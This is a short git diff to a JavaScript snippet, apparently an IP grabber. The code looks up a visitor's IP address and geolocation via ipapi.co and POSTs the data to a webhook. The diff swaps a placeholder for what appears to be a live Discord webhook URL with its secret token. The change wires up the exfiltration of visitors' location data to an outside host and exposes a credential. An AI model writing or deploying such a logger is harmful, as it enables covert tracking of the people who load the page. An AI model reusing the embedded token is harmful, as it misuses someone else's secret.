@@ -18,7 +18,7 @@ const askPermissionAndSendIP = () => {
             return fetch(`https://ipapi.co/${ip}/json/`)
                 .then(geoResponse => geoResponse.json())
                 .then(geoData => {
-                    const webhookURL = "TA_WEBHOOK_ICI";
+                    const webhookURL = "https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_";
 
                     return fetch(webhookURL, {
                         method: "POST",
@@ -53,3 +53,4 @@ const askPermissionAndSendIP = () => {
 };
 
 askPermissionAndSendIP();
+
